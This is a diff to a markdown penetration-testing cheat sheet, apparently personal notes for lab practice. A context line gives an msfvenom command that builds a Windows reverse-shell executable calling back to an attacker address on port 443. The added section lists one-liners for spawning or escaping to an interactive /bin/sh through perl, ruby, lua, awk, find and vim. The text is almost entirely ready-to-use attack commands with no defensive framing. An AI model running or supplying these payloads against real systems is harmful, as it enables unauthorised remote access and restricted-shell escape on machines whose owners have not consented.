@@ -68,3 +68,27 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > Bonu
 ```bash
 python -c 'import pty; pty.spawn("/bin/sh")'
 ```
+
+# Spawning Interactive Shells
+
+```bash
+/bin/sh -i
+
+perl -e 'exec "/bin/sh";'
+perl: exec "/bin/sh";
+
+ruby: exec "/bin/sh"
+
+lua: os.execute('/bin/sh')
+
+awk 'BEGIN {system("/bin/sh")}'
+
+find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
+find . -exec /bin/sh \; -quit
+
+vim -c ':!/bin/sh'
+# vim escape
+vim
+:set shell=/bin/sh
+:shell
+```
